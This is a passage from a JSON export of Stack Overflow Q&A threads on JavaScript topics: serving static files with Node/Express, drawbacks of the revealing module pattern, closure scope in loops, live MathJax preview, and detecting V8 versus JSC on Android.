                    "body": "<p>Express has a built in middleware for this.  It's part of <a href=\"https://github.com/senchalabs/connect\" rel=\"nofollow\">connect</a>, which express is built on.  The middleware itself uses <a href=\"https://github.com/visionmedia/send\" rel=\"nofollow\">send</a>.</p>\n\n<pre><code>// just add the middleware to your app stack via `use`\napp.use(express.static(yourpath));\n</code></pre>\n\n<p>In answer to your comment, no, there is no way to manually select files.  Though by default the middleware will ignore folders prefixed with <code>.</code>, so for example a folder named <code>.hidden</code> would not be served.</p>\n\n<p>To hide files or folders manually, you could insert your own middleware before <code>static</code> to filter out paths before the request reaches it.  The following would prevent serving any files from folders named <code>hidden</code>:</p>\n\n<pre><code>app.use(function(req, res, next) {\n  if (/\\/hidden\\/*/.test(req.path)) {\n    return res.send(404, \"Not Found\"); // or 403, etc\n  });\n  next();\n});\napp.use(express.static(__dirname+\"/public\"));\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 13
                },
                {
                    "body": "<p>If you want to have a solution without using Express (as you asked for \"simple\" explicitly), check out the <a href=\"https://github.com/cloudhead/node-static\">node-static</a> module.</p>\n\n<p>It allows you to serve a folder just like the appropriate middleware for Express, but it also allows you to serve only specific files.</p>\n\n<p>In the simplest case it's just:</p>\n\n<pre><code>var http = require('http'),\n    static = require('node-static');\n\nvar folder = new(static.Server)('./foo');\n\nhttp.createServer(function (req, res) {\n    req.addListener('end', function () {\n        folder.serve(req, res);\n    });\n}).listen(3000);\n</code></pre>\n\n<p>If you need some examples, have a look at the GitHub project page, there are several of them.</p>\n\n<p>PS: You can even install node-static globally and use it as a CLI tool by just running it from the shell inside the folder you wish to serve:</p>\n\n<pre><code>$ static\n</code></pre>\n\n<p>That's it :-)!</p>\n\n<p>PPS: Regarding your original example, it would be way better to use piping with streams here instead of loading all the files in a synchronous way.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>If you want a really simple way then I would like to show you my module (it is not only for static files) <a href=\"http://micnic.github.com/simpleS/\" rel=\"nofollow\">simpleS</a>, install it using <code>npm install simples</code>.</p>\n\n<p>Put all your files in a folder, for example <code>files</code>.</p>\n\n<p>Here is the magic:</p>\n\n<pre><code>var simples = require('simples');\n\nvar server = simples(80);\n\nserver.serve('files');\n\n/* if you want to catch the acces to a folder and to do something, try this:\nserver.serve('files', function (connection, files) {\n    // Your application logic\n    // For example show the files of the folder\n});\n*/\n</code></pre>\n\n<p>You don't need to care about the content type of the files, it will detect it automatically from file extension</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>As mentioned in the accepted answer for <a href=\"http://stackoverflow.com/questions/16333790/node-js-quick-file-server-static-files-over-http\">this question</a>, I'd recommend using <a href=\"https://github.com/nodeapps/http-server\" rel=\"nofollow\">http-server</a>.</p>\n\n<p>It can be started via command line without any config</p>\n\n<pre><code>cd /path/to/directory\nhttp-server\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Personally I prefer to server files from nginx (I also use it for gzip encoding, caching, SSL handling and load balancing)  and node provides just the API. Maybe not the answer you're looking for but it offers interesting choices. Maybe you can have a look at this approach and find that you like it ;) </p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I'm using a rather ugly approach:</p>\n\n<pre><code>var app = require('express')(),\n    server = require('http').createServer(app),\n    fs = require('fs');\nserver.listen(80);\n\npath = \"/Users/my/path/\";\n\nvar served_files = {};\n[\"myfile1.html\",\"myfile2.html\",\"myfile3.html\"].forEach(function(file){\n    served_files[\"/\"+file] = fs.readFileSync(path+file,\"utf8\");\n});\n\napp.use(function(req,res){\n    if (served_files[req.path]) \n        res.send(files[req.path]);\n});\n</code></pre>\n\n<p>What's the proper way to do it?</p>\n",
            "last_activity_date": 1401372346,
            "question_id": 14576644,
            "score": 6,
            "tags": [
                "javascript",
                "node.js",
                "express"
            ],
            "title": "What&#39;s the simplest way to serve static files using node.js?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I read the article that @nemesv referenced me to (Thanks :)) and I thinks there is one more disadvantage that was not mentioned, so I thought I'd add it here for reference. Here is a quote from the article:</p>\n\n<blockquote>\n  <p>Disadvantages</p>\n  \n  <p>A disadvantage of this pattern is that if a private function refers to\n  a public function, that public function can't be overridden if a patch\n  is necessary. This is because the private function will continue to\n  refer to the private implementation and the pattern doesn't apply to\n  public members, only to functions.</p>\n  \n  <p>Public object members which refer to private variables are also\n  subject to the no-patch rule notes above.</p>\n  \n  <p>As a result of this, modules created with the Revealing Module pattern\n  may be more fragile than those created with the original Module\n  pattern, so care should be taken during usage.</p>\n</blockquote>\n\n<p>And my addition:</p>\n\n<p><strong>You can't use inheritance with this pattern</strong>. For example:</p>\n\n<pre><code>var Obj = function(){\n    //do some constructor stuff\n}\n\nvar InheritingObj = function(){\n    //do some constructor stuff\n}\n\nInheritingObj.prototype = new Obj();\n\nInheritingObj.prototype.constructor = InheritingObj;\n</code></pre>\n\n<p>This a simple example for inheritance in js, but when using the <a href=\"http://blog.pluralsight.com/2012/10/09/revealing-prototype-pattern-structuring-javascript-code-part-iv/\" rel=\"nofollow\">Revealing Prototype Pattern</a> you'll need to do this:</p>\n\n<pre><code>InheritingObj.prototype = (function(){\n    //some prototype stuff here\n}());\n</code></pre>\n\n<p>which will override you inheritance.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>The Revealing Module Pattern (RMP) creates objects that don't behave well with respect to overriding. As a consequence, objects made using the RMP don't work well as prototypes. So if you're using RMP to create objects that are going to be used in an inheritance chain, just don't. <em>This point of view is my own, in opposition to those proponents of the Revealing Prototype Pattern.</em></p>\n\n<p>To see the bad inheritance behavior, take the following example of a url builder:</p>\n\n<pre><code>function rmpUrlBuilder(){\n  var _urlBase = \"http://my.default.domain/\";\n  var _build = function(relUrl){\n    return _urlBase + relUrl;\n  };\n\n  return {\n    urlBase: _urlBase,\n    build: _build\n  }\n}\n</code></pre>\n\n<p>Setting aside the question of why you would use RMP for an object with no private components, note that if you take the returned object and override urlBase with \"<a href=\"http://stackoverflow.com\">http://stackoverflow.com</a>\", you would expect the behavior of build() to change appropriately. It doesn't, as seen in the following:</p>\n\n<pre><code>var builder = new rmpUrlBuilder();\nbuilder.urlBase = \"http://stackoverflow.com\";\nconsole.log(builder.build(\"/questions\"); // prints \"http://my.default.domain/questions\" not \"http://stackoverflow.com/questions\"\n</code></pre>\n\n<p>Contrast the behavior with the following url builder implementation</p>\n\n<pre><code>function urlBuilder = function(){\n  return {\n    urlBase: \"http://my.default.domain/\".\n    build: function(relUrl){ return this.urlBase + relUrl;}\n  }\n}\n\nvar builder = new urlBuilder();\nbuilder.urlBase = \"http://stackoverflow.com\";\nconsole.log(builder.build()); // prints \"http://stackoverflow.com/questions\"\n</code></pre>\n\n<p>which behaves correctly.</p>\n\n<p>You can correct the Revealing Module Pattern's behavior by using this scope as in the following</p>\n\n<pre><code>function rmpUrlBuilder(){\n  var _urlBase = \"http://my.default.domain/\";\n  var _build = function(relUrl){\n    return this.urlBase + relUrl;\n  };\n\n  return {\n    urlBase: _urlBase,\n    build: _build\n  }\n}\n</code></pre>\n\n<p>but that rather defeats the purpose of the Revealing Module Pattern. For more details, see my blog post <a href=\"http://ilinkuo.wordpress.com/2013/12/28/defining-return-object-literals-in-javascript/\" rel=\"nofollow\">http://ilinkuo.wordpress.com/2013/12/28/defining-return-object-literals-in-javascript/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Other disadvantages with the Revealing Module Pattern include:</p>\n\n<ol>\n<li>Tight coupling of the public functions with the Return statement</li>\n<li>Mixed usage of object literal for public functions and standalone declarations for private functions</li>\n</ol>\n\n<p>I'd recommend using the Definitive Module Pattern over the Revealing Module Pattern\n(<a href=\"https://github.com/tfmontague/definitive-module-pattern\" rel=\"nofollow\">https://github.com/tfmontague/definitive-module-pattern</a>)</p>\n",
                    "is_accepted": false,
                    "score": -1
                }
            ],
            "body": "<p>I recently got familiar with the Revealing Module pattern and I've read quite a few articles about it.</p>\n\n<p>It seems like a very good pattern and I would like to start using it in a big project I have. In the project I'm using : Jquery, KO ,requirejs, Jquery Mobile, JayData. It seems to me like it'll be a good fit for the KO ViewModels.</p>\n\n<p>In specific I'd like to use <a href=\"http://blog.pluralsight.com/2012/10/09/revealing-prototype-pattern-structuring-javascript-code-part-iv/\" rel=\"nofollow\">THIS</a> version of it.</p>\n\n<p>One thing I could not find are disadvantages for using this pattern, is it because there aren't any (I find it hard to believe)?</p>\n\n<p>What should i consider before starting to use it?</p>\n",
            "last_activity_date": 1404795450,
            "question_id": 14050755,
            "score": 6,
            "tags": [
                "javascript",
                "design-patterns",
                "knockout.js",
                "revealing-module-pattern"
            ],
            "title": "Revealing module pattern disadvantages"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>All of your callbacks share the same <code>i</code> variable.<br>\nWhen the event handler actually runs, <code>i</code> is after the end of the array.</p>\n\n<p>You need to wrap the loop body in a self-invoking function that takes <code>i</code> as a parameter.<br>\nThis way, each iteration will get its own, unchanging, <code>i</code> variable.</p>\n\n<p>For example:</p>\n\n<pre><code>for (var i = 0; i &lt; statesPolyStrings.length; i++) {\n    (function(i) {\n        ...\n    })(i);\n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 16
                },
                {
                    "body": "<pre><code>for (var i = 0; i &lt; statesPolyStrings.length; i++) {\n    (function(i){\n        google.maps.event.addDomListener(document.getElementById(statesPolyStrings[i]), 'mouseover', function() {\n        $(\"#\"+statesPolyStrings[i]).addClass(\"highlight\");\n        statesPolyObjects[i].setOptions({ strokeWeight: '2' });\n        });\n    })(i)\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The trick with self-invoking functions works fine: it creates a new scope (maybe google for 'scope in functions javascript') and therefore handles <code>i</code> as a different variable and delivers the right value to your event listener callback function.</p>\n\n<p>But you actually don't need to find your element <strong>again</strong> with jQuery as you already assigned an event listener to it and inside your function you have a reference to your element with <strong><code>this</code></strong>.</p>\n\n<p>And as you're using jQuery anyhow, it's then easy to find the correct index (your <code>i</code>) of <code>statesPolyObjects</code> with <a href=\"http://api.jquery.com/jQuery.inArray/\" rel=\"nofollow\"><code>$.inArray()</code></a> passing the id of your element and the <code>statesPolyStrings</code> array (assuming you're dealing with unique IDs. If not, <code>$(\"#\"+statesPolyStrings[i])</code> would also fail, as it takes the first it finds).</p>\n\n<pre><code>var el;\n\nfor (var i = 0, len = statesPolyStrings.length; i &lt; len; i++) {\n    el = document.getElementById(statesPolyStrings[i]);\n\n    google.maps.event.addDomListener(el, 'mouseover', function(event) {\n        $(this).addClass(\"highlight\");\n        statesPolyObjects[$.inArray(this.id, statesPolyStrings)].\n            setOptions({ strokeWeight: '2' });\n    });\n}\n</code></pre>\n\n<p>If you still want to stick with the self-invoking function you should anyhow change the following line:</p>\n\n<pre><code>(\"#\"+statesPolyStrings[i]).addClass(\"highlight\");\n</code></pre>\n\n<p>to</p>\n\n<pre><code>$(this).addClass(\"highlight\");\n</code></pre>\n\n<p>If you're not familiar enough with <strong><code>this</code></strong> and events you might want to read this article:\n<a href=\"http://www.sitepoint.com/javascript-this-event-handlers/\" rel=\"nofollow\">http://www.sitepoint.com/javascript-this-event-handlers/</a></p>\n\n<p>You might have noticed that I also wrote the argument <strong><code>event</code></strong> inside the anonymous callback function. Try to <code>console.log</code> this event you get delivered for free with any event listener callback function and explore all the other things you have access to. For example, you can find the actual element you clicked on with <code>event.target</code> (as the actual mouseover might have happened to a child of your element). So:</p>\n\n<pre><code>google.maps.event.addDomListener(el, 'mouseover', function(event) {\n    console.log(event);\n    ...\n</code></pre>\n\n<p>and open the console of your browser to see what event delivers...</p>\n\n<p>Be aware though that <code>google.maps.event.addDomListener</code> passes something different then <code>document.body.addEventListener</code> and there is also a difference between browsers. jQuery.on() for example also delivers some different things in the event object, but there you can at least count on the same data in all browsers.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>How do I maintain access to the <code>i</code> variable inside my for loop below? I'm trying to learn, not just get the answer, so a bit of explanation would be very helpful. Thank you!</p>\n\n<pre><code>var el, \n    len = statesPolyStrings.length;\n\nfor (var i = 0; i &lt; len; i++) {\n    el = document.getElementById(statesPolyStrings[i]);\n\n    google.maps.event.addDomListener(el, 'mouseover', function() {\n        $(\"#\"+statesPolyStrings[i]).addClass(\"highlight\");\n        statesPolyObjects[i].setOptions({ strokeWeight: '2' });\n    });\n}\n</code></pre>\n",
            "last_activity_date": 1378639750,
            "question_id": 10954053,
            "score": 6,
            "tags": [
                "javascript"
            ],
            "title": "Javascript variable scope inside for loop"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Instead of using <code>onchange</code> try <code>onkeypress</code> or <code>onkeyup</code>.</p>\n\n<p><code>onchange</code> is only triggered when you leave the field, but the others (obviously) happen with each key-stroke.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>I suspect you are using Internet Explorer, which doesn't fire <code>onchange</code> events as often or efficiently as other browsers.</p>\n\n<p>The version in the <a href=\"http://cdn.mathjax.org/mathjax/latest/test/sample-dynamic.html\" rel=\"nofollow\">MathJax Examples</a> includes more code to handle IE better. You might want to look at the source code there for details.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>How do I modify this mathjax example to live preview while I type? Right now it only displays result after I have pressed enter. I would like to tweak it so that it works similar to how stackoverflow/math.stackexchange shows the preview when typing a question.</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;MathJax Dynamic Math Test Page&lt;/title&gt;\n\n&lt;script type=\"text/x-mathjax-config\"&gt;\n  MathJax.Hub.Config({\n    tex2jax: {\n      inlineMath: [[\"$\",\"$\"],[\"\\\\(\",\"\\\\)\"]]\n    }\n  });\n&lt;/script&gt;\n&lt;script type=\"text/javascript\"\n  src=\"http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML-full\"&gt;\n&lt;/script&gt;\n\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;script&gt;\n  //\n  //  Use a closure to hide the local variables from the\n  //  global namespace\n  //\n  (function () {\n    var QUEUE = MathJax.Hub.queue;  // shorthand for the queue\n    var math = null;                // the element jax for the math output.\n\n    //\n    //  Get the element jax when MathJax has produced it.\n    //\n    QUEUE.Push(function () {\n      math = MathJax.Hub.getAllJax(\"MathOutput\")[0];\n    });\n\n    //\n    //  The onchange event handler that typesets the\n    //  math entered by the user\n    //\n    window.UpdateMath = function (TeX) {\n      QUEUE.Push([\"Text\",math,\"\\\\displaystyle{\"+TeX+\"}\"]);\n    }\n  })();\n&lt;/script&gt;\n\nType some TeX code:\n&lt;input id=\"MathInput\" size=\"50\" onchange=\"UpdateMath(this.value)\" /&gt;\n&lt;p&gt;\n\n&lt;div id=\"MathOutput\"&gt;\nYou typed: ${}$\n&lt;/div&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
            "last_activity_date": 1345800229,
            "question_id": 7925622,
            "score": 6,
            "tags": [
                "javascript",
                "jquery",
                "mathjax"
            ],
            "title": "Display mathjax output in realtime"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I think the better question is: Why do you care? You're basically falling into the \"browser detection\" trap that a lot of people fell into in the late 90's / early 00's. Since then, though, we've learned that it's <em>feature detection</em> that's the more useful approach, not least because the features supported in a given browser were (mostly) a moving target. There's code now, running on IE9 with its dramatically-improved DOM and JavaScript support, that's not using those features because it's doing browser detection and falling back on IE6 techniques.</p>\n\n<p>So rather than worrying about V8 vs. JSC, just worry about the features you want. I don't know anything about JSC, but for instance let's assume it doesn't have the <code>forEach</code> method on arrays that V8 has (part of the ECMAScript 5th edition standard). Rather than throwing a big \"V8 vs. JSC\" lever, you'd do:</p>\n\n<pre><code>if (typeof Array.prototype.forEach === \"function\") {\n    // Code that expects `forEach`\n}\nelse {\n    // Code that falls back\n}\n</code></pre>\n\n<p>(Your \"code that falls back\" might <em>add</em> <code>forEach</code> to the prototype, or maybe this test is in your own iterator function and you want to know whether to defer to a native implementation or supply your own.)</p>\n\n<p>And similarly for other features you want to use that may or may not be present.</p>\n\n<hr>\n\n<p>But if you really need to detect V8 vs. JSC (and from your comment it seems you may), <a href=\"http://www.byond.com/members/Kunark?command=view_post&amp;post=53727\" rel=\"nofollow\">this page</a> seems to demonstrate a means of doing so, though it seems awfully fragile. Here's my slightly-edited version (not least to replace <code>window.devicePixelRatio</code> with the test for <code>WebkitAppearance</code>&nbsp;&mdash; the former gives false positives on at least some other browsers [Firefox, for instance, which uses Gecko, not WebKit]):</p>\n\n<pre><code>var v8string = 'function%20javaEnabled%28%29%20%7B%20%5Bnative%20code%5D%20%7D';\n\nif ('WebkitAppearance' in document.documentElement.style)  //If (probably) WebKit browser\n{\n   if (escape(navigator.javaEnabled.toString()) === v8string)\n   {\n      display('V8 detected');\n   }\n   else\n   {\n      display('JSC detected');\n   }\n}\nelse {\n  display(\"Not a WebKit browser\");\n}\n</code></pre>\n\n<p><a href=\"http://jsbin.com/opuvas\" rel=\"nofollow\">Live example</a></p>\n\n<p>Works for me detecting the difference between Chrome (which also uses V8) and Safari (which also uses JSC).</p>\n",
                    "is_accepted": true,
                    "score": 15
                },
                {
                    "body": "<p>Although the answer above points out the best methods, I thought I'd point out another way of doing this from inside a native library.</p>\n\n<pre><code>void *dlWebCoreHandle = dlopen(\"libwebcore.so\", RTLD_NOW);\nvoid *v8GetVersion = dlsym(dlWebCoreHandle, \"_ZN2v82V810GetVersionEv\");\nif (v8GetVersion == NULL) {\n    /* does not appear to be V8 */\n} ... etc.\n</code></pre>\n\n<p>The exported symbols are mangled, unfortunately, so there is no 100% guarantee that the compiler used by your firmware manufacturer mangled the symbol in the same way (use <code>nm --defined-only libwebcore.so -g</code> on a library with symbols). One would expose this function via the JNI and check from inside Java code.</p>\n\n<p>The <code>libwebcore.so</code> library also lists <code>V8_Fatal</code> as one of the symbols, which is not susceptible to mangling.</p>\n\n<p>JSC will have some other exported symbols that you can check for from inside a native library. If both are non-existent you can fallback to other methods.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<pre><code>var s = \"\";\nfor ( x in { 3:3, 1:1 } ) { s += x }\nif ( s === \"31\" ) alert( 'JSC' )\nelse alert( 'V8' )\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Newer versions of Android ( > 2.2) include the v8 javascript engine, while older versions only had JSC.  However, according to <a href=\"http://blogs.nitobi.com/joe/2011/01/14/android-your-js-engine-is-not-always-v8/\">http://blogs.nitobi.com/joe/2011/01/14/android-your-js-engine-is-not-always-v8/</a>, which javascript engine is used at runtime seems to depend on an environment variable present at build-time (<code>JS_ENGINE</code>), as well as the hardware specs of the device:</p>\n\n<pre><code># The default / alternative engine depends on the device class.\n# On devices with a lot of memory (e.g. Passion/Sholes), the\n# default is V8. On everything else, the only choice is JSC.\n</code></pre>\n\n<p>My question is this: is there any way that I can determine which javascript engine is in use from within a webpage, an embedded WebView, or an application?</p>\n\n<p>If the answer is no, does anybody know which JS engine is used by the Android emulator?</p>\n\n<hr>\n\n<p>The reason I'm asking this is because of this issue: <a href=\"http://code.google.com/p/android/issues/detail?id=12987\">http://code.google.com/p/android/issues/detail?id=12987</a></p>\n\n<p>Basically, it may be that the javascript-to-java bridge in JSC is broken on Android 2.3.X, and this impacts the application I'm trying to write.  I'm seeing a segfault from somewhere deep in the JNI on my emulator, but not on the handful of physical devices I've tested.  I'm trying to determine if this is an emulator-only thing, a JSC-only thing, or something different altogether.</p>\n",
            "last_activity_date": 1413650847,
            "question_id": 6768474,
            "score": 6,
            "tags": [
                "javascript",
                "android",
                "v8",
                "javascript-engine"
            ],
            "title": "How can I detect which javascript engine (v8 or JSC) is used at runtime in Android?"
        }
    ]
}
